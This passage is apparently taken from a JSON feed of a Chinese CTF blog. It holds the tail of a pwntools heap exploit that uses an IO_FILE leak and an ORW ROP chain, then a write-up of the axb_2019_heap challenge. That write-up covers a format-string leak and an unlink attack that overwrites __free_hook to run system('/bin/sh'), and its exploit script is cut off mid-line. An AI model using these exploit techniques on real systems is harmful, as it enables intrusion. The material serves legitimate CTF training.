class=\"token punctuation\">(</span><span class=\"token string\">\"address:[\"</span><span class=\"token punctuation\">)</span>\n  low_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">'0x1080'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x18b0</span>\n\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"low_addr\"</span><span class=\"token punctuation\">,</span>low_addr<span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#0x8910</span>\n  <span class=\"token comment\">#0x7000</span>\n  <span class=\"token comment\">#0x18b0</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0007000700070007</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\xb0\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#链到4</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xd6a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0001000100010001</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n  leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">if</span> leak <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> EOFError\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#stdout 0xd6a0</span>\n  offset <span class=\"token operator\">=</span> <span class=\"token number\">0x7f563057d6a0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7f563057c980</span>\n  _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> offset\n  libc_base <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\n  environ <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"environ\"</span><span class=\"token punctuation\">,</span>environ<span class=\"token punctuation\">)</span>\n\n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x120</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stack_addr\"</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n\n  read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"open\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  \n  ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000025679</span> <span class=\"token operator\">+</span> libc_base\n  syscall <span class=\"token operator\">=</span> <span class=\"token number\">0X00000000011B70B</span> <span class=\"token operator\">+</span> libc_base <span class=\"token comment\">#手找的</span>\n  pop_rax_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000004a550</span> <span class=\"token operator\">+</span> libc_base\n  pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000026b72</span> <span class=\"token operator\">+</span> libc_base\n  pop_rsi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000027529</span> <span class=\"token operator\">+</span> libc_base\n  pop_rdx_rbx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000001626d6</span> <span class=\"token operator\">+</span> libc_base\n  \n \n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop_rdi_ret\"</span><span class=\"token punctuation\">,</span>pop_rdi_ret<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"read_addr\"</span><span class=\"token punctuation\">,</span>read_addr<span class=\"token punctuation\">)</span>\n\n  <span class=\"token comment\">#gdb.attach(p,\"b *puts\")</span>\n  <span class=\"token comment\">#pause()</span>\n  payload <span class=\"token operator\">=</span>  p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_rbx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span>\n  \n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  \n  payload_orw <span class=\"token operator\">=</span> <span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_rbx_ret<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\n  \n  <span class=\"token comment\">#dbg()</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"done\"</span><span class=\"token punctuation\">,</span>payload_orw<span class=\"token punctuation\">)</span>\n  \n  \n  p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  \n\n<span class=\"token comment\">#to_pwn()</span>\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    log<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">continue</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   super_note.py\n@Time    :   2021/06/03 19:52:39\n@Author  :   Niyah \n'''</span>\n</code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "IO_FILE"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "url": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "title": "记一道Unlink",
            "date_published": "2021-04-02T14:10:27.000Z",
            "content_html": "<blockquote>\n<p>unlink</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<h2 id=\"初探\"><a class=\"markdownIt-Anchor\" href=\"#初探\">#</a> 初探</h2>\n<p>保护全开，特别哈人</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/1.png\"></center>\n<p>接下来打开 IDA 康康，可以发现开始有一个格式化字符串漏洞，那么我们可以用格式化字符串泄露栈上的值，那么我们最好是可以通过这个泄露出开 PIE 后的基地址和 libc 的基地址，这样就方便后面的操作</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/2.png\"></center>\n<p>输入函数存在可以溢出一个字节存在 off-by-one~~，既然存在 off-by-one 那么理应是有几种利用方法的，但我觉得 Unlink 更加 OK（~~</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/3.png\"></center>\n<h2 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h2>\n<p>我们在利用格式化字符串进行泄露时，我们可以动态调试一下，去看看栈上有哪些可以利用的地方，并且格式化字符串也并不是一次只能泄露出一个地址，我们可以贪心地把我们需要的栈上变量都泄露出来</p>\n<p>这里我们寻找栈上的变量直接发现第 10 个和第 14 个就是我们需要泄露的数据，（当然这里也可以找别的，只要能算出来就行…），又由于 64 位传参，前 6 个参数不在栈上所以是 10 + 6-1 和 14 + 6-1 为什么 - 1 懂的都懂</p>\n<blockquote>\n<p>%15$p,%19$p</p>\n</blockquote>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/4.png\"></center>\n<p>泄露之后我们就可以把开 PIE 后的基地址算出来，最后把指针数组的地址算出来就可以进行下一步利用了；</p>\n<h2 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> Unlink</h2>\n<ol>\n<li>\n<p>我们先申请 4 个堆块，既然要造成 Unlink<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>，那么 free 的那个大小应该至少属于 unsortedbin，大小大于 0x88 就可以，这里我们申请 0x98 大小的堆块，刚好就可以溢出到下一个堆块的 size 位</p>\n</li>\n<li>\n<p>改写一个 unsortedbin 之前的堆块，伪造出<kbd>fake_chunk</kbd>的结构（在一个正常堆块里伪造出一个 bin 结构）</p>\n</li>\n</ol>\n<blockquote>\n<p>提一嘴为什么是 ptr-0x8，因为我首先 malloc 了一个 chunk 没用它，其后我们要找一个指针指向我们的第二个 chunk 的数据段，当然就应该找数组存放的第二个指针了，用这个指针构造出一前一后两个 chunk 和<kbd>fake_chunk</kbd>相互 link 的假象，那么再释放第三个 chunk 时就会触发 Unlink，让其和前一个<kbd>fake_chunk</kbd>合并，合并的时候<kbd>fake_chunk</kbd>和数组 chunk 解连接，让数组的一个指针指向自己，完成 unlink</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">0xA1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre_size=0</td>\n<td style=\"text-align:center\">size=0x80</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd=ptr-0x8</td>\n<td style=\"text-align:center\">bk=ptr</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">…</td>\n<td style=\"text-align:center\">…</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">0x80</td>\n<td style=\"text-align:center\">0xa0</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>删除第三个堆块，让触发 unlink，这里数组的第二个指针指向了数组地址 - 0x8 位置</li>\n</ol>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/5.png\"></center>\n<h2 id=\"getshell\"><a class=\"markdownIt-Anchor\" href=\"#getshell\">#</a> Getshell</h2>\n<ol>\n<li>修改<kbd>free_hook</kbd>成为<kbd>system</kbd>函数的地址，<s>这题保护全开只能改<kbd>free_hook</kbd>，不然还可以改 atoi 函数</s></li>\n<li>删除第四个块，执行 system (&quot;/bin/sh&quot;) 成功 getshell</li>\n</ol>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc/libc-2.23.so\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p = process(\"./axb_2019_heap\")</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26984</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">choice</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p)</span>\n<span class=\"token comment\">#格式化字符串漏洞利用</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your name: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%15$p,%19$p\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, \"</span><span class=\"token punctuation\">)</span>\nlibc_start_main <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">240</span>\nlibc_base <span class=\"token operator\">=</span> libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_start_main: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x116a</span>\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"base: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nnote_addr <span class=\"token operator\">=</span> arry <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span> <span class=\"token operator\">+</span> base\nfree_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"note_addr: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#unlink</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xa0\"</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#getshell</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span 